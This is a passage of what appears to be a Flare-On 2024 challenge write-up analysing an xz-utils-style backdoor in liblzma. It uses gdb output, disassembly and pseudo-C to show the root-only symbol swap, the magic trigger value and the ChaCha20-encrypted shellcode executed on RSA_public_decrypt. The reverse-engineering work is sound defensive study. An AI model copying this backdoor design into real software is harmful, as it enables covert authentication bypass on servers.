+<p>to get a bigger picture, lets find the start of the function and see what was performed. we <code>endbr64</code> @ <code>0x7f4a18c8f820</code> signifying the start of the function</p>
+<p><code>(gdb) x/32i 0x7f4a18c8f820</code></p>
+<p><img loading="lazy" src="/images/flare2024/crashfunction.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f855:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f857:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8a830</span> &lt;<span style="color:#66d9ef">getuid@plt</span>&gt;
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f85c:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">rsi</span>,[<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x19f79</span>]        <span style="color:#75715e"># 0x7f4a18ca97dc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f863:      <span style="color:#a6e22e">test</span>   <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f865:      <span style="color:#a6e22e">jne</span>    <span style="color:#ae81ff">0x7f4a18c8f877</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f867:      <span style="color:#a6e22e">cmp</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x0</span>],<span style="color:#ae81ff">0xc5407a48</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f86e:      <span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">0x7f4a18c8f8c0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f870:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">rsi</span>,[<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x19f51</span>]        <span style="color:#75715e"># 0x7f4a18ca97c8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f877:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">edi</span>,<span style="color:#66d9ef">edi</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f879:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8acf0</span> &lt;<span style="color:#66d9ef">dlsym@plt</span>&gt;
+</span></span></code></pre></div><p>keeping in mind the calling convention for <a href="https://man7.org/linux/man-pages/man3/dlsym.3.html">dlsym</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">dlsym</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">restrict</span> handle, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">restrict</span> symbol);
+</span></span></code></pre></div><p>checking out the potential symbols loaded into rsi:</p>
+<p><img loading="lazy" src="/images/flare2024/rsi_symbols.png"></p>
+<p>this loosely translates into the following psuedo-c:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> uid;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> symbol[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RSA_public_decrypt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>(<span style="color:#66d9ef">void</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (uid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (unknown <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc5407a48</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unknown_func</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    symbol <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RSA_public_decrypt &#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dlsym</span>(<span style="color:#ae81ff">0</span>, symbol);
+</span></span></code></pre></div><p>there are two posibilities, if the user id of the calling process is anything other than 0, the address of symbol <code>&quot;RSA_public_decrypt&quot;</code> will be resolved. if the user id of the calling process IS root, the address of the symbol <code>&quot;RSA_public_decrypt &quot;</code> (added space at the end) will be resolved. admittedly i do not have much reversing experience with backdoors and malware, but this is a dead giveaway of malicious activity.</p>
+<p>this seems to answer our first question of <strong>why did the program crash?</strong>:</p>
+<p>my immediate assumption is that the malicious symbol was attempted to be resolved by dlysym, but was unable to be resolved leading to the null ptr call crashing the program</p>
+<p>we still have this unknown function to account for that is called if the following condition is met:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x0</span>],<span style="color:#ae81ff">0xc5407a48</span>
+</span></span></code></pre></div><p>checking the current value of $rbp:</p>
+<pre tabindex="0"><code>(gdb) x/x $rbp
+0x55b46d51dde0: 0xc5407a48
+</code></pre><p>in the case of this execution the condition was met, meaning this jump was taken.. lets look at the exexecuted block: <code>(gdb) x/42i 0x7f4a18c8f8c0</code></p>
+<p><img loading="lazy" src="/images/flare2024/unknown_func.png"></p>
+<p>there is a lot going on here, well not really. we can start by analyzing the bytes moved into registers from the stack, as well as the additional functions that are called. we dont find anything of interest in the first few instructions, but in the call to <code>0x7f4a18c8f3f0</code> we find a constant value that gives us a big hint as to what is going on:</p>
+<p><img loading="lazy" src="/images/flare2024/unknown_func_1.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rdi</span>,<span style="color:#ae81ff">0x3320646e61707865</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rdi</span>,<span style="color:#ae81ff">0x6b20657479622d32</span>
+</span></span></code></pre></div><p>the absolute value that rdi is set to in both instances are constants used in the ChaCha20 stream cipher. analyzing the function further in ghidra confirms our theory. reviewing how the chacha20 stream cipher works, we reference the python3 <a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/chacha20.html">cryptodome</a> documentation for a quick overview.</p>
+<p>sparing you some time, stream ciphers work by generating the cipher stream given a key, in this case a key and nonce, then encrypts the data byte by byte using the stream cipher. stream ciphers are linear, meaning that the same key will both encrypt and decrypt the message.</p>
+<hr>
+<h3 id="analyzing-liblzmaso541">Analyzing liblzma.so.5.4.1<a hidden class="anchor" aria-hidden="true" href="#analyzing-liblzmaso541">#</a></h3>
+<p>based on the core dump we can confidently say something malicious is happening in the liblzma lib. to begin our analysis we will slap the .so into ghidra. we have some base strings to go off of, so we can simply <code>Search--&gt;For strings...</code> and filter for &ldquo;RSA_&rdquo;</p>
+<p><img loading="lazy" src="/images/flare2024/rsa_strings.png"></p>
+<p>once we find our strings we can navigate to them and look at the references to the strings to find the relevant function</p>
+<p><img loading="lazy" src="/images/flare2024/rsa_public_decrypt.png"></p>
+<p>based on our previous discoveries:</p>
+<ul>
+<li>sus dynamic resolution</li>
+<li>chacha20 stream cipher</li>
+</ul>
+<p>we can clean up the decompilation a bit and do some guess work:</p>
+<p><img loading="lazy" src="/images/flare2024/decomp.png"></p>
+<p>Lets go over this screenshot before moving further..</p>
+<ol>
+<li>Check for UID 0</li>
+<li>Check for param2 specific value, malicious trigger value</li>
+<li>Initialize ChaCha20 cipher</li>
+<li>Dynamically allocate some data for malicious function</li>
+<li>Decrypt bytes &ldquo;&amp;malicious&rdquo;</li>
+<li>Execute decrypted bytes</li>
+<li>Initialize ChaCha20 cipher</li>
+<li>Re-encrypt malicious bytes</li>
+<li>Dynamically resolve &ldquo;RSA_public_decrypt &quot;</li>
+</ol>
+<p>armed with this information we should be able to find and decrypt the bytes that are executed</p>
+<hr>
+<h3 id="decrypting-malicious-function">Decrypting malicious function<a hidden class="anchor" aria-hidden="true" href="#decrypting-malicious-function">#</a></h3>
+<p>i am going to go into detail as much as possible without skipping any steps, if you are more experienced you can gloss over this, if not this may be good material to learn from.</p>
+<p>x86 calling convention is as follows:</p>
+<p><code>func($rdi,$rsi,$rdx,$rcx,$r8,$r9,the rest passed from stack..);</code></p>
+<p>rax is typically the return value from the previously called function</p>
+<p>focusing on one piece at a time we will start with how much memory is allocated so we can determine the size of the malicious code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8e7:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">r9d</span>,<span style="color:#66d9ef">r9d</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8ea:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#ae81ff">0x22</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8ef:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">edi</span>,<span style="color:#66d9ef">edi</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8f1:      <span style="color:#a6e22e">movsxd</span> <span style="color:#66d9ef">rsi</span>,<span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x28a68</span>]        <span style="color:#75715e"># 0x7f4a18cb8360
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8f8:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">r8d</span>,<span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8fe:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">edx</span>,<span style="color:#ae81ff">0x7</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f903:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8a840</span> &lt;<span style="color:#66d9ef">mmap@plt</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f908:      <span style="color:#a6e22e">movsxd</span> <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x28a51</span>]        <span style="color:#75715e"># 0x7f4a18cb8360
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f90f:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">rsi</span>,[<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1a04a</span>]        <span style="color:#75715e"># 0x7f4a18ca9960
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f916:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdi</span>,<span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f919:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8a9e0</span> &lt;<span style="color:#66d9ef">memcpy@plt</span>&gt;
+</span></span></code></pre></div><p><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap documentation</a></p>
+<p><a href="https://man7.org/linux/man-pages/man3/memcpy.3.html">memcpy documentation</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mmap</span>(<span style="color:#66d9ef">void</span> addr[.length], <span style="color:#66d9ef">size_t</span> length, <span style="color:#66d9ef">int</span> prot, <span style="color:#66d9ef">int</span> flags,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">off_t</span> offset);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">memcpy</span>(<span style="color:#66d9ef">void</span> dest[<span style="color:#66d9ef">restrict</span> .n], <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> src[<span style="color:#66d9ef">restrict</span> .n],
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">size_t</span> n);
+</span></span></code></pre></div><p>lets reconstruct the call to mmap and memcpy ourselves, even though ghidra does it for us sometimes ghidra can be wrong, always good to double check:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>dest <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0f96</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(dest, <span style="color:#ae81ff">0x7f4a18ca9960</span>, <span style="color:#ae81ff">0x0f96</span>);
+</span></span></code></pre></div><p>we know that a memory block of 0x0f96 is being allocated, after allocation a block of memory is copied into the newly allocated region. directly following the call to memcpy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f91e:      <span style="color:#a6e22e">movsxd</span> <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rip</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x28a3b</span>]        <span style="color:#75715e"># 0x7f4a18cb8360
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f925:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdi</span>,<span style="color:#66d9ef">r15</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f928:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rsi</span>,<span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f92b:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x8</span>],<span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f930:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8f520</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f935:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">r8</span>,<span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f93a:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f93c:      <span style="color:#a6e22e">call</span>   <span style="color:#66d9ef">r8</span>
+</span></span></code></pre></div><ul>
+<li>$rax is moved into rsi</li>
+<li>$rax, which holds the location of the malicious code is is moved onto the stack at $rsp+0x8</li>
+<li>the ChaCha20 function is called, decrypting the function</li>
+<li>the function location is moved into $r8</li>
+<li>$r8 is called</li>
+</ul>
+<p>armed with this information the final steps before decrypting the malicious function are determining the data used to initialize the ChaCha20 cipher</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c0:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r11</span>,[<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x24</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c4:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r10</span>,[<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x4</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c8:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8ca:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r15</span>,[<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x20</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8cf:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">r11</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8d2:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rsi</span>,<span style="color:#66d9ef">r10</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8d5:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x18</span>],<span style="color:#66d9ef">r11</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8da:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdi</span>,<span style="color:#66d9ef">r15</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8dd:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x10</span>],<span style="color:#66d9ef">r10</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8e2:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8f3f0</span>
+</span></span></code></pre></div><p>while it is unlikely that the stack values align perfectly, we are hopeful that the register values still hold true as these instructions were executed not long before the program crashed. our main focus in this case is <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code></p>
+<p>within gdb lets execute <code>info reg</code> to check out the register values:</p>
+<pre tabindex="0"><code>rax            0x0                 0
+rbx            0x1                 1
+rcx            0x55b46d58e080      94233417015424
+rdx            0x55b46d58eb20      94233417018144
+rsi            0x55b46d51dde0      94233416556000
+rdi            0x200               512
+rbp            0x55b46d51dde0      0x55b46d51dde0
+rsp            0x7ffcc6601ea0      0x7ffcc6601ea0
+</code></pre><p>$rdi is set to an interesting int value of 512, while $rsi and $rdx are both set to addresses. reviewing them we see that $rdx is a zeroed out region, and $rsi contains what seems to be random bytes:</p>
+<pre tabindex="0"><code>(gdb) x/10gx $rsi
+0x55b46d51dde0: 0x38f63d94c5407a48      0xa51863dee21318a8
+0x55b46d51ddf0: 0x7b8abb2dbaa0f907      0x5ea6118dd06636a6
+0x55b46d51de00: 0x9f8336f26fd614c9      0x552986521a71cd4d
+0x55b46d51de10: 0x0dc2a7f9b7d15858      0x9605a3ea190ede36
+0x55b46d51de20: 0x418f170db9b959da      0xdcb50715eb7e3d42
+(gdb) x/10gx $rdx
+0x55b46d58eb20: 0x0000000000000000      0x0000000000000000
+0x55b46d58eb30: 0x0000000000000000      0x0000000000000000
+0x55b46d58eb40: 0x0000000000000000      0x0000000000000000
+0x55b46d58eb50: 0x0000000000000000      0x0000000000000000
+0x55b46d58eb60: 0x0000000000000000      0x0000000000000000
+</code></pre><p>examining the value at $rsi further, we see that it is 0x200 bytes in size
+lets dump this memory to a file for later use</p>
+<p><code>(gdb) dump memory rsi $rsi $rsi+512</code></p>
+<p>if you are unfamiliar with the command used reference <code>(gdb) help dump memory</code> :)</p>
+<p>looking closely, we also notice this is the same data that was used to determine if the program should begin malicious execution or not <code>487a 40c5</code></p>
+<hr>
+<p>up until now we have been looking passed exactly what is actually happening to trigger this execution, like where did this data even come from?</p>
+<p>Navigating to the previous stack frame, frame #2 using <code>(gdb) frame 2</code>, we look at the execution trace and notice that the program is calling <code>&lt;RSA_public_decrypt@plt&gt;</code>, which then triggers the conditional function we were looking at earlier in ghidra. This is where the backdoor actually begins working, when a client is authenticating to the server, the server calls the RSA public decrypt function from the PLT. in order for the malicious function to be called, there must have been some control flow tampering done such as manipulating the GOT or the PLT or applying a function hook to redirect/manipulate exexecution. if we refer to the <a href="https://linux.die.net/man/3/rsa_public_decrypt">man page</a> for this function we can see the calling convention:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">RSA_public_decrypt</span>(<span style="color:#66d9ef">int</span> flen, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>from,
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>to, RSA <span style="color:#f92672">*</span>rsa, <span style="color:#66d9ef">int</span> padding);
+</span></span></code></pre></div><p>referencing the stack trace we have:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c78679c:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">r9</span>,<span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867a1:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rsi</span>,<span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x18</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867a6:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rcx</span>,<span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867a9:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867ac:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">r8d</span>,<span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867b2:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">r12d</span>,<span style="color:#ae81ff">0xffffffea</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867b8:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">edi</span>,<span style="color:#66d9ef">r9d</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x55b46c7867bb:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x55b46c6e62b0</span> &lt;<span style="color:#66d9ef">RSA_public_decrypt@plt</span>&gt;
+</span></span></code></pre></div><p>so the value that we are referencing in $rsi represents the data <code>unsigned char *from</code> in the real <code>RSA_public_decrypt</code> call.</p>
+<p>so far this malicious backdoor operates almost exactly as did the &ldquo;real life&rdquo; backdoor that was installed in xz-utils. one difference i will note is that this implementation of the backdoor is using the <code>from</code> value of the function rather than the *RSA struct.</p>
+<hr>
+<p>back to decrypting the shellcode.</p>
+<p>looking at the instruction execution sequence before &ldquo;ChaCha20_init&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c0:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r11</span>,[<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x24</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c4:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r10</span>,[<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x4</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8c8:      <span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8ca:      <span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">r15</span>,[<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x20</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8cf:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">r11</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8d2:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rsi</span>,<span style="color:#66d9ef">r10</span>
